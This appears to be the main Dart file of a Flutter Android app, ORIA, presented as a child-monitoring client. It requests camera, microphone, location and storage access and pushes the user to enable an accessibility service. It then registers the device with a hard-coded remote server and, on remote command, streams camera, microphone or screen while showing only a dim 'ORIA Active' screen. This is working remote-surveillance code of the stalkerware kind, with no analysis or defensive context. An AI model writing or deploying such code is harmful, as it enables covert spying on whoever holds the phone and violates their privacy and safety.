import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'stream_service.dart';

const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';
const _captureChannel = MethodChannel('oria.capture/service');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await [
    Permission.camera,
    Permission.microphone,
    Permission.location,
    Permission.notification,
    Permission.storage,
  ].request();

  final prefs = await SharedPreferences.getInstance();
  final accessibilityEnabled = prefs.getBool('accessibility_enabled') ?? false;

  if (!accessibilityEnabled) {
    runApp(const EnableAccessibilityScreen());
    return;
  }

  await _captureChannel.invokeMethod('start');
  runApp(const OriaChildApp());
}

class EnableAccessibilityScreen extends StatelessWidget {
  const EnableAccessibilityScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.accessibility_new, color: Colors.indigo, size: 80),
                const SizedBox(height: 24),
                const Text('Activation requise', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 16),
                const Text('ORIA a besoin du service accessibilite.\n\n1. Cliquez ci-dessous\n2. Activez ORIA\n3. Revenez ici', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey, fontSize: 14)),
                const SizedBox(height: 32),
                FilledButton.icon(
                  onPressed: () async {
                    const intent = AndroidIntent(action: 'android.settings.ACCESSIBILITY_SETTINGS');
                    await intent.launch();
                  },
                  icon: const Icon(Icons.settings_accessibility),
                  label: const Text('OUVRIR PARAMETRES'),
                  style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50)),
                ),
                const SizedBox(height: 16),
                TextButton(
                  onPressed: () async {
                    final prefs = await SharedPreferences.getInstance();
                    await prefs.setBool('accessibility_enabled', true);
                    await _captureChannel.invokeMethod('start');
                    runApp(const OriaChildApp());
                  },
                  child: const Text('Deja active > Continuer', style: TextStyle(color: Colors.grey)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class OriaChildApp extends StatefulWidget {
  const OriaChildApp({super.key});
  @override
  State<OriaChildApp> createState() => _OriaChildAppState();
}

class _OriaChildAppState extends State<OriaChildApp> with WidgetsBindingObserver {
  late IO.Socket socket;
  StreamService? streamService;
  String deviceId = '';
  String deviceName = '';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _init();
  }

  Future<void> _init() async {
    final deviceInfo = DeviceInfoPlugin();
    final androidInfo = await deviceInfo.androidInfo;
    deviceId = androidInfo.id;
    deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';

    socket = IO.io(SERVER_URL, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 5000,
      'reconnectionAttempts': 999,
    });

    socket.on('connect', (_) {
      socket.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
    });

    socket.on('execute_command', (data) async {
      final action = data['action'];
      try {
        if (action == 'start_camera') {
          await streamService?.stop();
          streamService = StreamService(socket, 'parent-main');
          await streamService!.startCamera();
        } else if (action == 'start_mic') {
          await streamService?.stop();
          streamService = StreamService(socket, 'parent-main');
          await streamService!.startMic();
        } else if (action == 'start_screen') {
          await streamService?.stop();
          streamService = StreamService(socket, 'parent-main');
          await streamService!.startScreen();
        } else if (action == 'stop_stream') {
          await streamService?.stop();
          streamService = null;
        }
      } catch (e) {
        print('ORIA ERROR: $e');
      }
    });

    socket.on('signal', (msg) {
      streamService?.handleSignal(msg);
    });
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _captureChannel.invokeMethod('start');
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    streamService?.stop();
    socket.disconnect();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.visibility_off, color: Colors.grey[800], size: 100),
              const SizedBox(height: 20),
              Text("ORIA Active", style: TextStyle(color: Colors.grey[700], fontSize: 18)),
              const SizedBox(height: 10),
              Text("Service en arriere-plan actif.", style: TextStyle(color: Colors.grey[800], fontSize: 12)),
            ],
          ),
        ),
      ),
    );
  }
}